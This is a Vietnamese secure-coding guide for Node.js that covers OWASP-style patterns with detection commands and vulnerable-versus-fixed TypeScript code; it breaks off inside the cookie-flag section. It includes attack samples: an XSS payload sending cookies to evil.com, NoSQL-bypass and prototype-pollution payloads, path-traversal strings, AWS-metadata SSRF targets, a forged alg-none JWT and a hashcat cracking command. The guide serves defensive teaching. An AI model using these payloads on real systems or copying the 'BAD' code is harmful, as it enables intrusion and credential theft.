# Domain 03: Bảo Mật Web (Web Security)

| Trường thông tin | Giá trị |
|-----------------|---------|
| **Tên miền** | Bảo Mật Web (Web Security) |
| **Lĩnh vực** | Node.js / Security / OWASP |
| **Số lượng pattern** | 16 |
| **Ngôn ngữ** | TypeScript / Node.js |
| **Cập nhật** | 2026-02-18 |

---

## Tổng quan Bảo Mật Web Node.js

```
┌─────────────────────────────────────────────────────────────────┐
│                  OWASP TOP 10 - NODE.JS MAPPING                 │
│                                                                 │
│  A01 Broken Access Control  ──▶ JWT Algorithm None (P07)        │
│  A02 Cryptographic Failures ──▶ Weak Secret, Cookie Flags (P08) │
│  A03 Injection              ──▶ NoSQL (P01), Cmd (P10), Path(P05)│
│  A04 Insecure Design        ──▶ SSRF (P06), Open Redirect (P14) │
│  A05 Security Misconfiguration ──▶ CORS Wildcard (P09)          │
│  A06 Vulnerable Components  ──▶ npm audit (prevention)          │
│  A07 Auth Failures          ──▶ Rate Limit (P15)                │
│  A08 Deserialization        ──▶ Insecure Deserialize (P12)       │
│  A09 Logging Failures       ──▶ Secret In Source (P16)           │
│  A10 SSRF                   ──▶ SSRF (P06)                       │
│                                                                 │
│  Node.js Specific Risks:                                        │
│  ├── Prototype Pollution (P03) - đặc thù JavaScript             │
│  ├── ReDoS (P04) - regex catastrophic backtracking              │
│  ├── eval/Function Constructor (P11) - dynamic code exec        │
│  └── Header Injection CRLF (P13) - HTTP response splitting      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Pattern 01: NoSQL Injection (MongoDB $gt/$ne)

### 1. Tên
**NoSQL Injection qua MongoDB Operator**

### 2. Phân loại
- **Domain:** Injection / Database Security
- **Subcategory:** MongoDB Query Injection, Operator Injection

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Cho phép bypass xác thực, truy cập dữ liệu tuỳ ý, đọc toàn bộ collection

### 4. Vấn đề

MongoDB chấp nhận object lồng nhau trong query. Nếu input từ client được truyền thẳng vào query mà không sanitize, attacker có thể inject các toán tử MongoDB như `$gt`, `$ne`, `$regex`, `$where` để bypass điều kiện lọc.

```
ATTACK FLOW:
┌──────────────┐    POST /login                    ┌─────────────┐
│   Attacker   │──▶ {"username": "admin",    ──────▶│  Express    │
│              │     "password": {"$gt": ""}}       │  Handler    │
└──────────────┘                                    └──────┬──────┘
                                                           │ truyền thẳng vào query
                                                    ┌──────▼──────┐
                                                    │   MongoDB   │
                    db.users.findOne({              │             │
                      username: "admin",    ◀────── │  BYPASS!    │
                      password: {$gt: ""}           │  Trả về     │
                    })                              │  user đầu   │
                    ← khớp với mọi password!        └─────────────┘
```

**Ví dụ thực tế bị tấn công:**
- Bypass login với `{"password": {"$ne": null}}`
- Dump toàn bộ collection với `{"username": {"$regex": ".*"}}`
- Blind injection với `{"$where": "sleep(5000)"}`

### 5. Phát hiện

```bash
# Tìm query MongoDB dùng trực tiếp req.body
rg "findOne\(.*req\.(body|query|params)" --type ts -n

# Tìm find với object spread từ request
rg "find\(\{.*\.\.\.(req|request)\." --type ts -n

# Tìm password query không có string coercion
rg "password\s*:\s*req\.(body|query)\." --type ts -n

# Tìm mongoose query dùng input trực tiếp
rg "\.find\(req\.|\.findOne\(req\." --type ts -n
```

### 6. Giải pháp

```typescript
// ❌ BAD: Truyền thẳng req.body vào MongoDB query
import { Request, Response } from 'express'
import User from './models/User'

app.post('/login', async (req: Request, res: Response) => {
  const { username, password } = req.body
  // NGUY HIỂM: password có thể là object {"$ne": null}
  const user = await User.findOne({ username, password })
  if (user) {
    res.json({ token: generateToken(user) })
  }
})

// ✅ GOOD: Sanitize input, ép kiểu, dùng thư viện mongo-sanitize
import sanitize from 'mongo-sanitize'
import { z } from 'zod'
import bcrypt from 'bcrypt'

const loginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(200),
})

app.post('/login', async (req: Request, res: Response) => {
  // Bước 1: Validate schema - đảm bảo password là string
  const parsed = loginSchema.safeParse(req.body)
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid input' })
  }

  // Bước 2: Sanitize loại bỏ $ operator
  const clean = sanitize(parsed.data)

  // Bước 3: Query chỉ theo username (string), so password hash riêng
  const user = await User.findOne({
    username: String(clean.username) // ép kiểu string
  })

  if (!user || !(await bcrypt.compare(clean.password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  res.json({ token: generateToken(user) })
})

// ✅ GOOD: Middleware toàn cục với express-mongo-sanitize
import mongoSanitize from 'express-mongo-sanitize'

app.use(mongoSanitize({
  replaceWith: '_',     // thay $ bằng _
  onSanitize: ({ req, key }) => {
    console.warn(`Sanitized key: ${key} from ${req.ip}`)
  }
}))
```

### 7. Phòng ngừa

```bash
# Cài đặt thư viện bảo vệ
npm install express-mongo-sanitize mongo-sanitize zod

# npm audit kiểm tra mongoose vulnerabilities
npm audit --audit-level=high
```

```json
// ESLint rule: cảnh báo truy cập req.body trực tiếp vào query
// .eslintrc.json
{
  "rules": {
    "no-restricted-syntax": [
      "error",
      {
        "selector": "CallExpression[callee.property.name=/find|findOne|findById/] > ObjectExpression > Property[key.name='password'][value.type!='CallExpression']",
        "message": "Avoid passing req.body directly to MongoDB query. Use schema validation first."
      }
    ]
  }
}
```

---

## Pattern 02: XSS Qua Template (EJS `<%-` Unescaped)

### 1. Tên
**Cross-Site Scripting Qua EJS Template Unescaped Output**

### 2. Phân loại
- **Domain:** Injection / XSS
- **Subcategory:** Stored XSS, Reflected XSS, Template Injection

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Attacker thực thi JavaScript tuỳ ý trong trình duyệt nạn nhân, đánh cắp session/cookie, chiếm tài khoản

### 4. Vấn đề

EJS cung cấp hai cú pháp output:
- `<%= value %>` - có escape HTML (an toàn)
- `<%- value %>` - KHÔNG escape HTML (nguy hiểm nếu dùng với user input)

```
XSS ATTACK FLOW:
┌──────────────┐   GET /search?q=<script>        ┌─────────────┐
│   Attacker   │──▶ alert(document.cookie)  ─────▶│  Express +  │
│              │   </script>                      │  EJS Server │
└──────────────┘                                  └──────┬──────┘
                                                         │ render template
                    template.ejs:                 ┌──────▼──────┐
                    <h1><%- query %></h1>   ──────▶│  Browser    │
                                                  │  EXECUTES   │
                                                  │  SCRIPT!    │
                    ← cookie bị gửi tới           └─────────────┘
                      attacker server
```

**Ví dụ thực tế bị tấn công:**
- Search page: `?q=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`
- Comment field lưu `<script>...</script>` vào database
- Profile name chứa `"><script>stealData()</script>`

### 5. Phát hiện

```bash
# Tìm unescaped EJS output (nguy hiểm)
rg "<%-" --type ejs -n

# Tìm unescaped output trong tất cả template files
rg "<%-\s*\w*(req|query|param|body|user|input)" -n

# Tìm res.send với string concatenation (potential XSS)
rg "res\.send\(.*\+.*req\.(body|query|params)" --type ts -n

# Tìm innerHTML assignment
rg "innerHTML\s*=\s*" --type ts --type js -n

# Tìm dangerouslySetInnerHTML trong React
rg "dangerouslySetInnerHTML" --type tsx --type jsx -n
```

### 6. Giải pháp

```typescript
// ❌ BAD: Dùng <%- với user input trong EJS template
// views/search.ejs
/*
  <h1>Kết quả tìm kiếm: <%- query %></h1>  ← NGUY HIỂM
  <p>Tìm thấy <%- results.length %> kết quả</p>
*/

// ❌ BAD: Route truyền user input không sanitize vào template
app.get('/search', (req: Request, res: Response) => {
  const query = req.query.q as string
  res.render('search', { query, results: [] })
})

// ✅ GOOD: Dùng <%= để auto-escape, hoặc sanitize trước
import createDOMPurify from 'dompurify'
import { JSDOM } from 'jsdom'
import escape from 'escape-html'

const window = new JSDOM('').window
const DOMPurify = createDOMPurify(window as unknown as Window)

app.get('/search', (req: Request, res: Response) => {
  const rawQuery = req.query.q as string ?? ''

  // Escape HTML entities cho plain text output
  const safeQuery = escape(rawQuery)

  // Nếu cần render HTML (ví dụ từ rich text editor) - dùng DOMPurify
  const sanitizedHtml = DOMPurify.sanitize(rawQuery, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  })

  res.render('search', {
    query: safeQuery,       // dùng với <%=  (đã escape)
    richContent: sanitizedHtml  // dùng với <%- (đã purify)
  })
})

// ✅ GOOD: Template an toàn
/*
  views/search.ejs:
  <h1>Kết quả tìm kiếm: <%= query %></h1>   ← dùng <%= để escape
  <%- richContent %>                          ← chỉ dùng <%- khi đã DOMPurify
*/

// ✅ GOOD: Content Security Policy header
import helmet from 'helmet'

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],          // chặn inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: [],
  }
}))
```

### 7. Phòng ngừa

```bash
npm install escape-html dompurify jsdom helmet

# Audit thư viện template engines
npm audit
```

```json
// ESLint: cấm innerHTML unsafe patterns
{
  "rules": {
    "no-restricted-properties": [
      "error",
      { "object": "element", "property": "innerHTML",
        "message": "Use textContent or DOMPurify.sanitize() before innerHTML" }
    ]
  }
}
```

---

## Pattern 03: Prototype Pollution (Deep Merge)

### 1. Tên
**Prototype Pollution Qua Object Deep Merge**

### 2. Phân loại
- **Domain:** JavaScript Runtime / Object Security
- **Subcategory:** Property Injection, Prototype Chain Manipulation

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Có thể dẫn đến RCE (Remote Code Execution), bypass authorization, DOS, hoặc thay đổi hành vi toàn bộ ứng dụng

### 4. Vấn đề

JavaScript cho phép thay đổi `Object.prototype` thông qua các key đặc biệt như `__proto__`, `constructor`, `prototype`. Khi code merge object từ user input vào object khác một cách đệ quy (deep merge), attacker có thể inject thuộc tính vào prototype chain.

```
PROTOTYPE POLLUTION FLOW:
┌──────────────┐   POST /settings                  ┌─────────────┐
│   Attacker   │──▶ {"__proto__": {"admin": true}}──▶│   Server    │
│              │                                   │  deepMerge  │
└──────────────┘                                   └──────┬──────┘
                                                          │
                    deepMerge({}, payload)         ┌──────▼──────┐
                    → Object.prototype.admin = true │  Prototype  │
                                                   │  POLLUTED!  │
                                                   └──────┬──────┘
                                                          │ ảnh hưởng mọi object
                    ({}).admin === true  ◀─────────────── │
                    ANY object giờ có
                    thuộc tính admin!
```

**Hệ quả thực tế:**
- `isAdmin` bypass: `if (user.isAdmin)` trả về `true` cho mọi user
- Template injection qua polluted template options
- DOS qua polluted `length` hoặc `toString`

### 5. Phát hiện

```bash
# Tìm hàm deep merge tự viết
rg "function\s+deepMerge|function\s+merge|lodash\.merge|merge\(" --type ts -n

# Tìm truy cập __proto__ trực tiếp
rg "__proto__|constructor\.prototype" --type ts --type js -n

# Tìm recursive merge với bracket notation
rg "\[key\]\s*=.*\[key\]" --type ts -n

# Tìm Object.assign với user input
rg "Object\.assign\(.*req\.(body|query)" --type ts -n

# Tìm spread operator với untrusted source
rg "\.\.\.(req|request)\.(body|query|params)" --type ts -n
```

### 6. Giải pháp

```typescript
// ❌ BAD: Deep merge tự viết không kiểm tra key nguy hiểm
function deepMerge(target: Record<string, any>, source: Record<string, any>) {
  for (const key in source) {
    // NGUY HIỂM: key có thể là "__proto__" hoặc "constructor"
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {}
      deepMerge(target[key], source[key])
    } else {
      target[key] = source[key]  // ← POLLUTION!
    }
  }
  return target
}

// Attacker gửi: {"__proto__": {"isAdmin": true}}
deepMerge(userSettings, req.body)
// Kết quả: Object.prototype.isAdmin = true

// ✅ GOOD: Deep merge an toàn - kiểm tra key nguy hiểm
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype'])

function safeMerge<T extends Record<string, unknown>>(
  target: T,
  source: Record<string, unknown>
): T {
  for (const key of Object.keys(source)) {
    // Chặn các key nguy hiểm
    if (FORBIDDEN_KEYS.has(key)) {
      console.warn(`Blocked prototype pollution attempt: key="${key}"`)
      continue
    }

    const sourceVal = source[key]
    const targetVal = target[key]

    if (
      sourceVal !== null &&
      typeof sourceVal === 'object' &&
      !Array.isArray(sourceVal) &&
      typeof targetVal === 'object'
    ) {
      target[key] = safeMerge(
        targetVal as Record<string, unknown>,
        sourceVal as Record<string, unknown>
      ) as T[typeof key]
    } else {
      target[key] = sourceVal as T[typeof key]
    }
  }
  return target
}

// ✅ GOOD: Dùng Object.create(null) - object không có prototype
const safeObj = Object.create(null)
// safeObj.__proto__ === undefined → không thể pollute

// ✅ GOOD: Dùng lodash.merge với phiên bản đã patch (>= 4.17.21)
import { mergeWith } from 'lodash'

// ✅ GOOD: Freeze Object.prototype trong bootstrap
Object.freeze(Object.prototype)

// ✅ GOOD: Parse và validate với schema trước khi merge
import { z } from 'zod'

const settingsSchema = z.object({
  theme: z.enum(['light', 'dark']),
  language: z.string().max(10),
  notifications: z.boolean().optional(),
}).strict() // chặn unknown keys

app.post('/settings', (req: Request, res: Response) => {
  const parsed = settingsSchema.safeParse(req.body)
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid settings' })
  }
  // parsed.data chỉ chứa các field đã khai báo
  updateUserSettings(userId, parsed.data)
})
```

### 7. Phòng ngừa

```bash
# Kiểm tra lodash version (phải >= 4.17.21)
npm list lodash
npm audit fix

# Cài công cụ detect prototype pollution
npm install --save-dev @npmcli/arborist
```

```json
// ESLint rule: cấm truy cập __proto__
{
  "rules": {
    "no-proto": "error",
    "no-extend-native": "error"
  }
}
```

---

## Pattern 04: ReDoS (Regex Catastrophic Backtracking)

### 1. Tên
**Regular Expression Denial of Service (ReDoS)**

### 2. Phân loại
- **Domain:** Availability / Performance Attack
- **Subcategory:** Algorithmic Complexity Attack, CPU Exhaustion

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Một request có thể làm đóng băng Node.js event loop hàng giây đến hàng giờ, tương đương DOS

### 4. Vấn đề

Một số regex có độ phức tạp thời gian là O(2^n) khi gặp input đặc biệt (evil input). Vì Node.js single-threaded, một regex chậm sẽ chặn toàn bộ event loop.

```
CATASTROPHIC BACKTRACKING:
Regex: /^(\d+)+$/
Input: "111111111111111111111!"  (n số 1, kết thúc bằng !)

Backtracking tree:
(\d+)+  thử:
├── "111...1" → fail tại !
│   ├── "111...1" "1" → fail tại !
│   │   ├── "111...1" "1" "1" → fail tại !
│   │   │   └── ... (2^n branches!)
Thời gian: O(2^n) - với n=30 → hàng triệu bước!

TIMELINE:
t=0ms   : Request đến với evil input
t=0ms   : Regex bắt đầu match
t=10s   : Event loop bị block hoàn toàn
t=10s   : Tất cả request khác bị treo
t=...   : DOS thành công!
```

**Các pattern regex nguy hiểm phổ biến:**
- `(a+)+` hoặc `(\d+)+` - nested quantifiers
- `(a|a)+` - alternation với overlap
- `(a*)*` - nested star

### 5. Phát hiện

```bash
# Tìm regex với nested quantifiers
rg "\(\w+\+\)\+" --type ts -n
rg "\(\w+\*\)\*" --type ts -n

# Tìm regex test với user input
rg "\.test\(req\.(body|query|params)\|\.exec\(req\." --type ts -n

# Tìm regex dùng trong validation middleware
rg "RegExp|new RegExp" --type ts -n

# Dùng safe-regex để phát hiện unsafe regex (chạy script)
# npm install -g safe-regex
# safe-regex '(\d+)+'
```

### 6. Giải pháp

```typescript
// ❌ BAD: Regex với nested quantifiers - O(2^n)
const emailRegex = /^([a-zA-Z0-9_\-\.]+)+@([a-zA-Z0-9_\-\.]+)+\.[a-zA-Z]{2,}$/

app.post('/register', (req: Request, res: Response) => {
  const { email } = req.body
  // NGUY HIỂM: evil input sẽ chặn event loop
  if (!emailRegex.test(email)) {
    return res.status(400).json({ error: 'Invalid email' })
  }
})

// ❌ BAD: Dynamic regex từ user input
app.get('/search', (req: Request, res: Response) => {
  const pattern = req.query.pattern as string
  const regex = new RegExp(pattern)  // NGUY HIỂM!
  const results = data.filter(item => regex.test(item.name))
})

// ✅ GOOD: Dùng thư viện validate có giới hạn thời gian
import { validate as validateEmail } from 'email-validator'
import validator from 'validator'

app.post('/register', (req: Request, res: Response) => {
  const { email } = req.body
  // email-validator dùng linear-time regex
  if (!validator.isEmail(String(email))) {
    return res.status(400).json({ error: 'Invalid email' })
  }
})

// ✅ GOOD: Timeout cho regex với worker thread
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads'

async function safeRegexTest(
  pattern: string,
  input: string,
  timeoutMs = 100
): Promise<boolean> {
  return new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { isMainThread, parentPort, workerData } = require('worker_threads');
      const { pattern, input } = workerData;
      const regex = new RegExp(pattern);
      parentPort.postMessage(regex.test(input));
    `, { eval: true, workerData: { pattern, input } })

    const timer = setTimeout(() => {
      worker.terminate()
      reject(new Error('Regex timeout - potential ReDoS'))
    }, timeoutMs)

    worker.on('message', (result) => {
      clearTimeout(timer)
      resolve(result)
    })
    worker.on('error', reject)
  })
}

// ✅ GOOD: Dùng re2 library (linear time regex engine)
import RE2 from 're2'

const safePattern = new RE2('^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$')
if (!safePattern.test(email)) {
  return res.status(400).json({ error: 'Invalid email' })
}
```

### 7. Phòng ngừa

```bash
# Cài re2 - linear time regex engine (Google RE2)
npm install re2

# Kiểm tra regex có safe không
npm install -g safe-regex
safe-regex '(\d+)+'
# → false = UNSAFE

# Kiểm tra toàn bộ codebase
npm install --save-dev vuln-regex-detector
```

```json
// ESLint plugin detect unsafe regex
{
  "plugins": ["security"],
  "rules": {
    "security/detect-unsafe-regex": "error",
    "security/detect-non-literal-regexp": "error"
  }
}
```

---

## Pattern 05: Path Traversal (`path.join` với `..`)

### 1. Tên
**Path Traversal / Directory Traversal Attack**

### 2. Phân loại
- **Domain:** File System Security / Injection
- **Subcategory:** Local File Inclusion (LFI), Directory Traversal

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Attacker đọc được file nhạy cảm như `/etc/passwd`, `.env`, private keys, source code

### 4. Vấn đề

Khi ứng dụng xây dựng đường dẫn file từ user input mà không validate, attacker có thể dùng `../` để thoát khỏi thư mục cho phép.

```
PATH TRAVERSAL ATTACK:
Dự kiến:  /app/uploads/avatar.jpg
                          ↑
                     user input

Attack:   GET /files?name=../../etc/passwd
          path.join('/app/uploads/', '../../etc/passwd')
          → /app/etc/passwd
          → /etc/passwd  ← ĐỌC ĐƯỢC!

DIRECTORY TREE:
/
├── etc/
│   ├── passwd  ← attacker muốn đọc
│   └── shadow
└── app/
    └── uploads/       ← thư mục cho phép
        └── avatar.jpg ← file hợp lệ

../.. từ uploads → /app/../.. → /
```

**Ví dụ URL attack:**
- `?file=../../../.env`
- `?file=....//....//....//etc/passwd` (bypass filter naïve)
- `?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd` (URL encoded)

### 5. Phát hiện

```bash
# Tìm fs operations với user input
rg "readFile|readFileSync|createReadStream" --type ts -n -A 2

# Tìm path.join với req params
rg "path\.join.*req\.(query|params|body)" --type ts -n

# Tìm __dirname concatenation
rg "__dirname.*\+.*req\." --type ts -n

# Tìm send file với dynamic path
rg "res\.sendFile\(.*req\." --type ts -n
rg "res\.download\(.*req\." --type ts -n
```

### 6. Giải pháp

```typescript
import path from 'path'
import fs from 'fs'
import { promisify } from 'util'

const readFile = promisify(fs.readFile)

// ❌ BAD: Dùng trực tiếp user input để tạo path
app.get('/files', async (req: Request, res: Response) => {
  const filename = req.query.name as string
  // NGUY HIỂM: filename có thể là "../../etc/passwd"
  const filePath = path.join(__dirname, 'uploads', filename)
  const content = await readFile(filePath)
  res.send(content)
})

// ✅ GOOD: Validate path nằm trong thư mục cho phép
const UPLOAD_DIR = path.resolve(__dirname, 'uploads')

async function safeReadFile(filename: string): Promise<Buffer> {
  // Bước 1: Chỉ lấy basename - loại bỏ mọi directory component
  const safeName = path.basename(filename)

  // Bước 2: Xây dựng path tuyệt đối
  const filePath = path.resolve(UPLOAD_DIR, safeName)

  // Bước 3: Kiểm tra path có nằm trong UPLOAD_DIR không
  if (!filePath.startsWith(UPLOAD_DIR + path.sep)) {
    throw new Error('Path traversal attempt detected')
  }

  // Bước 4: Kiểm tra file tồn tại và là regular file
  const stat = await fs.promises.stat(filePath)
  if (!stat.isFile()) {
    throw new Error('Not a file')
  }

  return fs.promises.readFile(filePath)
}

app.get('/files', async (req: Request, res: Response) => {
  try {
    const filename = req.query.name as string
    if (!filename || typeof filename !== 'string') {
      return res.status(400).json({ error: 'Invalid filename' })
    }

    // Validate ký tự cho phép trong filename
    if (!/^[a-zA-Z0-9_\-\.]+$/.test(filename)) {
      return res.status(400).json({ error: 'Invalid filename characters' })
    }

    const content = await safeReadFile(filename)
    res.send(content)
  } catch (error) {
    res.status(404).json({ error: 'File not found' })
  }
})

// ✅ GOOD: Dùng serve-static với strict option
import serveStatic from 'serve-static'

app.use('/files', serveStatic(UPLOAD_DIR, {
  dotfiles: 'deny',    // chặn .env, .htaccess
  index: false,        // chặn directory listing
  fallthrough: false   // 404 thay vì continue
}))
```

### 7. Phòng ngừa

```bash
npm install serve-static

# Kiểm tra path traversal trong code
npm install --save-dev eslint-plugin-security
```

```json
{
  "rules": {
    "security/detect-non-literal-fs-filename": "error"
  }
}
```

---

## Pattern 06: SSRF (Server-Side Request Forgery)

### 1. Tên
**Server-Side Request Forgery (SSRF)**

### 2. Phân loại
- **Domain:** Network Security / Input Validation
- **Subcategory:** Internal Network Exposure, Cloud Metadata Exploitation

### 3. Mức nghiêm trọng
🟠 **HIGH** - Attacker dùng server làm proxy để truy cập internal services, AWS metadata, database, admin panels

### 4. Vấn đề

Khi server thực hiện HTTP request đến URL do user cung cấp mà không validate, attacker có thể redirect request đến internal resources không được phép.

```
SSRF ATTACK:
┌──────────────┐   POST /webhook              ┌─────────────┐
│   Attacker   │──▶ {"url": "http://         ─▶│  Your Server│
│  (external)  │   169.254.169.254/           │             │
└──────────────┘   latest/meta-data/           └──────┬──────┘
                   iam/security-credentials"}          │ fetch(url)
                                               ┌──────▼──────┐
                                               │ AWS Metadata│
                                               │  Service    │
                                               │ credentials!│
                                               └─────────────┘
TARGETS phổ biến:
- http://169.254.169.254/ (AWS/GCP/Azure metadata)
- http://localhost:6379/ (Redis)
- http://10.0.0.1/ (Internal services)
- http://admin.internal/ (Admin panels)
- file:///etc/passwd (File protocol)
```

### 5. Phát hiện

```bash
# Tìm fetch/axios với user-controlled URL
rg "fetch\(.*req\.(body|query|params)" --type ts -n
rg "axios\.(get|post)\(.*req\.(body|query)" --type ts -n

# Tìm URL constructor với user input
rg "new URL\(.*req\." --type ts -n

# Tìm http.request với dynamic hostname
rg "http\.request|https\.request" --type ts -n -A 3
```

### 6. Giải pháp

```typescript
import { URL } from 'url'
import dns from 'dns/promises'
import net from 'net'
import axios from 'axios'

// ❌ BAD: Fetch URL từ user input không validate
app.post('/preview', async (req: Request, res: Response) => {
  const { url } = req.body
  // NGUY HIỂM: url có thể là http://169.254.169.254/
  const response = await fetch(url)
  const content = await response.text()
  res.json({ content })
})

// ✅ GOOD: Validate URL trước khi fetch
const ALLOWED_PROTOCOLS = ['https:', 'http:']
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '::1']

// Kiểm tra IP có phải private/link-local không
function isPrivateIP(ip: string): boolean {
  const privateRanges = [
    /^10\./,
    /^172\.(1[6-9]|2\d|3[01])\./,
    /^192\.168\./,
    /^127\./,
    /^169\.254\./,    // link-local (AWS metadata!)
    /^::1$/,          // IPv6 loopback
    /^fc00:/,         // IPv6 private
    /^fe80:/,         // IPv6 link-local
  ]
  return privateRanges.some(range => range.test(ip))
}

async function validateAndFetch(rawUrl: string): Promise<string> {
  // Bước 1: Parse URL
  let parsed: URL
  try {
    parsed = new URL(rawUrl)
  } catch {
    throw new Error('Invalid URL format')
  }

  // Bước 2: Chỉ cho phép HTTPS
  if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
    throw new Error(`Protocol not allowed: ${parsed.protocol}`)
  }

  // Bước 3: Chặn hostname nguy hiểm
  const hostname = parsed.hostname.toLowerCase()
  if (BLOCKED_HOSTS.includes(hostname)) {
    throw new Error('Hostname not allowed')
  }

  // Bước 4: Resolve DNS và kiểm tra IP thực sự
  let addresses: string[]
  try {
    addresses = (await dns.resolve4(hostname))
  } catch {
    throw new Error('DNS resolution failed')
  }

  for (const ip of addresses) {
    if (isPrivateIP(ip)) {
      throw new Error(`Resolved to private IP: ${ip}`)
    }
  }

  // Bước 5: Chỉ fetch URL đã validate, với timeout
  const controller = new AbortController()
  const timeout = setTimeout(() => controller.abort(), 5000)

  try {
    const response = await fetch(rawUrl, {
      signal: controller.signal,
      redirect: 'error',   // không follow redirect (bypass risk)
    })
    return await response.text()
  } finally {
    clearTimeout(timeout)
  }
}

app.post('/preview', async (req: Request, res: Response) => {
  try {
    const { url } = req.body
    const content = await validateAndFetch(String(url))
    res.json({ content: content.substring(0, 10000) }) // giới hạn size
  } catch (error) {
    res.status(400).json({ error: (error as Error).message })
  }
})
```

### 7. Phòng ngừa

```bash
# Dùng thư viện SSRF prevention
npm install ssrf-req-filter
```

```typescript
// Dùng ssrf-req-filter với axios
import ssrfFilter from 'ssrf-req-filter'

const agent = ssrfFilter('https://your-app.com')
await axios.get(userUrl, { httpAgent: agent, httpsAgent: agent })
```

---

## Pattern 07: JWT Secret Weak / Algorithm None

### 1. Tên
**JWT Insecure - Secret Yếu hoặc Algorithm "none"**

### 2. Phân loại
- **Domain:** Authentication / Cryptography
- **Subcategory:** JWT Vulnerabilities, Algorithm Confusion

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Attacker tự tạo JWT hợp lệ, giả mạo bất kỳ user nào kể cả admin

### 4. Vấn đề

JWT có thể bị tấn công theo hai cách:
1. **Algorithm "none"**: Server chấp nhận JWT không có chữ ký
2. **Weak secret**: Secret quá ngắn/đơn giản bị brute-force với hashcat/john

```
ATTACK 1 - Algorithm None:
Original JWT:
  header: {"alg": "HS256", "typ": "JWT"}
  payload: {"userId": 123, "role": "user"}
  signature: abc123...

Forged JWT:
  header: {"alg": "none", "typ": "JWT"}
  payload: {"userId": 1, "role": "admin"}    ← tự tạo
  signature: (empty)
  → jwt.verify() CHẤP NHẬN!

ATTACK 2 - Weak Secret Bruteforce:
Secret: "secret" hoặc "password" hoặc "123456"
hashcat -a 0 -m 16500 token.jwt wordlist.txt
→ tìm ra secret → forge bất kỳ token
```

### 5. Phát hiện

```bash
# Tìm JWT verify không chỉ định algorithm
rg "jwt\.verify\(" --type ts -n -A 3

# Tìm JWT sign với secret ngắn hoặc hardcoded
rg "jwt\.sign\(" --type ts -n -A 3

# Tìm secret hardcoded
rg "secret.*=.*['\"].*['\"]" --type ts -n
rg "JWT_SECRET.*=.*['\"]" --type ts -n

# Tìm algorithms: ['none'] hoặc không có algorithms option
rg "algorithms.*none" --type ts -n
```

### 6. Giải pháp

```typescript
import jwt from 'jsonwebtoken'

// ❌ BAD: Secret yếu, không giới hạn algorithm
const JWT_SECRET = 'secret'  // NGUY HIỂM: quá đơn giản

function verifyToken(token: string) {
  // NGUY HIỂM: chấp nhận bất kỳ algorithm kể cả "none"
  return jwt.verify(token, JWT_SECRET)
}

// ❌ BAD: Secret hardcoded trong code
const TOKEN = jwt.sign({ userId: 1 }, 'hardcoded-secret-123')

// ✅ GOOD: Secret mạnh từ env, giới hạn algorithm
const JWT_SECRET = process.env.JWT_SECRET
if (!JWT_SECRET || JWT_SECRET.length < 64) {
  throw new Error('JWT_SECRET must be at least 64 characters')
}

interface JWTPayload {
  userId: number
  role: string
  iat?: number
  exp?: number
}

function signToken(payload: Omit<JWTPayload, 'iat' | 'exp'>): string {
  return jwt.sign(payload, JWT_SECRET, {
    algorithm: 'HS256',   // chỉ định rõ algorithm
    expiresIn: '1h',
    issuer: 'your-app',
    audience: 'your-users',
  })
}

function verifyToken(token: string): JWTPayload {
  return jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'], // WHITELIST - chặn "none" và các alg khác
    issuer: 'your-app',
    audience: 'your-users',
  }) as JWTPayload
}

// ✅ BEST: Dùng RS256 với public/private key pair
import { readFileSync } from 'fs'

const privateKey = readFileSync('./keys/private.pem')
const publicKey = readFileSync('./keys/public.pem')

function signRS256(payload: object): string {
  return jwt.sign(payload, privateKey, {
    algorithm: 'RS256',
    expiresIn: '1h',
  })
}

function verifyRS256(token: string): object {
  return jwt.verify(token, publicKey, {
    algorithms: ['RS256'], // chỉ chấp nhận RS256
  })
}

// Generate strong secret:
// node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

### 7. Phòng ngừa

```bash
# Tạo JWT secret mạnh
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Lưu vào .env (không commit!)
echo "JWT_SECRET=<generated-secret>" >> .env
echo ".env" >> .gitignore

npm install jsonwebtoken
npm install --save-dev @types/jsonwebtoken
```

---

## Pattern 08: Cookie Flags Thiếu (`httpOnly`/`secure`/`sameSite`)

### 1. Tên
**Cookie Không Có Security Flags (httpOnly / secure / sameSite)**

### 2. Phân loại
- **Domain:** Session Management / Browser Security
- **Subcategory:** Session Hijacking, CSRF, Cookie Theft

### 3. Mức nghiêm trọng
🟠 **HIGH** - Cookie session bị đánh cắp qua XSS, hoặc bị gửi trong CSRF attack

### 4. Vấn đề

```
THIẾU httpOnly → XSS đọc được cookie:
document.cookie → "session=abc123; token=xyz"
                            ↑
                    BẰNG JAVASCRIPT!

THIẾU secure → Cookie gửi qua HTTP:
GET http://example.com/ HTTP/1.1
Cookie: session=abc123   ← gửi qua plain text, MITM đọc được

THIẾU sameSite → CSRF attack:
<img src="https://bank.com/transfer?to=evil&amount=10000">
→ Browser tự động gửi cookie của bank!
```

### 5. Phát hiện

```bash
